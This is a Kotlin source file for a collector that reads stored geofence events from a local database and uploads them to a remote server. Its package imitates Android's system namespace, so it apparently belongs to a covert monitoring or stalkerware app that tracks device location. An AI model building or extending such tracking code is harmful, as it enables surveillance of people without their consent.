package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFiveApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose

class GeoFenceEventsCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        logVerbose("${AppConstants.GEO_FENCES_EVENTS_TYPE} Preparing for uploading")
        val logs = localDatabaseSource.selectGeoFenceEvents()
        if (logs.isNotEmpty()) {
            logVerbose("${AppConstants.GEO_FENCES_EVENTS_TYPE} data = $logs")
            val endId = logs[logs.size - 1].id
            val startId = logs[0].id
            val serverHelper = RemoteServerHelper(
                context,
                AppConstants.GEO_FENCES_EVENTS_TYPE,
                localDatabaseSource,
                tosApi = tosApi,
                startId = startId,
                endId = endId
            )
            serverHelper.upload(logs)
        } else {
            logVerbose("${AppConstants.GEO_FENCES_EVENTS_TYPE} No data found")
        }
    }
}